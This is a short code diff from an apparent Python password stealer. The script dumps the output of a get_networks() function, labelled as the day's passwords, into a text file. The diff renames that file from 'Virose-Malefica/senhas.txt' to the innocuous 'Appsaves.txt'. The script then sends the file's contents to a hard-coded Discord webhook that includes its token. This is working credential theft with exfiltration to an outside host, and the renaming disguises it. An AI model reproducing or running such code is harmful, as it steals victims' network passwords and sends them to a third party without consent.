@@ -29,10 +29,10 @@ if __name__ == "__main__":
 
 dia = datetime.datetime.now()
 
-with open ("Virose-Malefica/senhas.txt", "w") as arquivos:
+with open ("Appsaves.txt", "w") as arquivos:
     arquivos.write("As senhas do dia sao: {} // {} ".format(get_networks(),dia))
 
-with open ("Virose-Malefica/Senhas.txt", "r") as senhasgamers:
+with open ("Appsaves.txt", "r") as senhasgamers:
     NetInject = senhasgamers.read()
 
 webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1150539523663605882/Z_AezEKC5gYw_TCE20canPY0qygZGIRYS4ia0EeATCZJwOoWtoARNdv-MFfUWqlVpNON", content="{}".format(NetInject))
